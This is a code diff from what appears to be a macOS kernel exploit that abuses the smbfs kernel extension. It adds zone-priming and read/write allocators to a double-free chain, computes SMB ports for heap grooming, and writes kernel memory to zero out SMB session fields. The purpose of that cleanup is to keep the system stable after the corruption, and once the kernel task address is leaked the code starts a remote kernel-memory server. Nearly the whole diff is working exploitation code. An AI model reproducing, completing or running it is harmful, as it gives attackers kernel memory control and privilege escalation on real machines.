@@ -21,11 +21,13 @@
 #include "kmem_remote.h"
 
 #include "external/smbfs/smb_trantcp.h"
+#include "smb/params.h"
 #include "smb/client.h"
 #include "util_ptrauth.h"
 #include "platform_variables.h"
 #include "platform_constants.h"
 #include "slider.h"
+#include "slider_kext.h"
 #include "xnu_proc.h"
 #include "allocator_msdosfs.h"
 #include "kmem_msdosfs.h"
@@ -33,6 +35,11 @@
 #include "kmem/zkext_free.h"
 #include "kmem/zkext_alloc_small.h"
 #include "kmem/allocator_rw.h"
+#include "kmem/zkext_prime_util.h"
+
+
+#define NUM_SMB_SERVER_PORTS 64
+#define SMB_PORT_FOR_INDEX(base_addr, index, count) (ntohs((base_addr)->sin_port) + (index / ((count + NUM_SMB_SERVER_PORTS - 1) / NUM_SMB_SERVER_PORTS)))
 
 
 int find_server_pid(void) {
@@ -91,6 +98,42 @@ ushort find_lport_for_fport(int server_pid, ushort fport) {
 }
 
 
+void patch_smb_iod(xe_slider_kext_t smbfs_slider, uintptr_t iod) {
+    uintptr_t gss = KMEM_OFFSET(iod, offsetof(struct smbiod, iod_gss));
+    xe_kmem_write_uint32(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_spn_len)), 0);
+    xe_kmem_write_uint64(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_spn)), 0);
+    xe_kmem_write_uint32(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_cpn_len)), 0);
+    xe_kmem_write_uint64(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_cpn)), 0);
+}
+
+
+void patch_session_interface_table(xe_slider_kext_t smbfs_slider, uintptr_t table) {
+    xe_kmem_write_uint32(KMEM_OFFSET(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_COUNT_OFFSET), 0);
+    xe_kmem_write_uint64(KMEM_OFFSET(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET), 0);
+}
+
+
+void patch_smb_session(xe_slider_kext_t smbfs_slider, uintptr_t session) {
+    uintptr_t iod = xe_kmem_read_uint64(KMEM_OFFSET(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET));
+    if (iod) {
+        patch_smb_iod(smbfs_slider, iod);
+    }
+    uintptr_t session_interface_table = KMEM_OFFSET(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET);
+    patch_session_interface_table(smbfs_slider, session_interface_table);
+}
+
+
+void patch_smb_sessions(xe_slider_kext_t smbfs_slider) {
+    uintptr_t smb_session_list = xe_slider_kext_slide(smbfs_slider, XE_KEXT_SEGMENT_DATA, XE_SMB_VAR_SMB_SESSION_LIST_OFFSET_DATA);
+    uintptr_t cursor = xe_kmem_read_uint64(KMEM_OFFSET(smb_session_list, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_CHILDREN_OFFSET));
+    while (cursor != 0) {
+        assert(XE_VM_KERNEL_ADDRESS_VALID(cursor));
+        patch_smb_session(smbfs_slider, cursor);
+        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_NEXT_OFFSET));
+    }
+}
+
+
 int main(void) {
     smb_client_load_kext();
     xe_allocator_msdosfs_loadkext();
@@ -134,6 +177,9 @@ int main(void) {
         capture_fds[index] = smb_client_open_dev();
     });
     
+    kmem_zkext_prime_util_t pre_allocator = kmem_zkext_prime_util_create(&smb_addr);
+    kmem_zkext_prime_util_prime(pre_allocator, 128, 255);
+    
     kmem_zkext_free_session_execute(zkext_free_session, &dbf_entry);
     
     char* data = alloca(256);
@@ -162,7 +208,7 @@ int main(void) {
     
     dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
         struct sockaddr_in addr = smb_addr;
-        addr.sin_port = htons(ntohs(smb_addr.sin_port) + index / (num_capture_fds / 32));
+        addr.sin_port = htons(SMB_PORT_FOR_INDEX(&smb_addr, index, num_capture_fds));
         int error = smb_client_ioc_negotiate(capture_fds[index], &addr, sizeof(addr), FALSE);
         assert(error == 0);
     });
@@ -208,7 +254,7 @@ int main(void) {
     dbf_entry.addr_list.tqh_first = NULL;
     
     dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
-        uint16_t port = ntohs(smb_addr.sin_port) + index / (num_capture_fds / 32);
+        uint16_t port = SMB_PORT_FOR_INDEX(&smb_addr, index, num_capture_fds);
         if (nbpcb_port == port) {
             close(capture_fds[index]);
             capture_fds[index] = -1;
@@ -358,6 +404,8 @@ int main(void) {
     printf("vnode_worker_bridge: %p\n", (void*)vnode_worker_bridge);
     printf("vnode_helper_bridge: %p\n", (void*)vnode_helper_bridge);
     
+    rw_allocator = kmem_allocator_rw_create(&smb_addr, num_rw_allocs);
+    
     struct kmem_msdosfs_init_args args;
     bzero(&args, sizeof(args));
     args.helper_bridge_fd = helper_bridge_fd;
@@ -371,8 +419,6 @@ int main(void) {
     xe_allocator_msdosfs_get_mountpoint(worker_allocator, args.worker_mount_point, sizeof(args.worker_mount_point));
     xe_allocator_msdosfs_get_mountpoint(helper_allocator, args.helper_mount_point, sizeof(args.helper_mount_point));
     args.helper_mutator = ^(void* ctx, char* data) {
-        kmem_allocator_rw_t capture_allocators = kmem_allocator_rw_create(&smb_addr, 256);
-        
         struct smbiod iod;
         kmem_smbiod_rw_read_iod(smbiod_rw, &iod);
         iod.iod_gss.gss_cpn = (uint8_t*)msdosfs_helper;
@@ -382,7 +428,7 @@ int main(void) {
         int error = smb_client_ioc_ssn_setup(*captured_fd, any_data, sizeof(any_data), any_data, sizeof(any_data));
         assert(error == 0);
         
-        error = kmem_allocator_rw_allocate(capture_allocators, 256, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
+        error = kmem_allocator_rw_allocate(rw_allocator, num_rw_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
             *data1 = data;
             *data1_size = sizeof(args.helper_data);
             *data2 = data;
@@ -395,6 +441,15 @@ int main(void) {
     
     uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
     printf("kernproc: %p\n", (void*)kernproc);
+    
+    xe_slider_kext_t smbfs_slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
+    patch_smb_sessions(smbfs_slider);
+    kmem_allocator_rw_destroy(&rw_allocator);
+    close(*captured_fd);
+    close(rw_fd);
+    kmem_smbiod_rw_destroy(&smbiod_rw);
+    kmem_zkext_free_session_destroy(&zkext_free_session);
+    kmem_allocator_prpw_destroy(&allocated_entry.element_allocator);
     
     xe_kmem_remote_server_start();
     
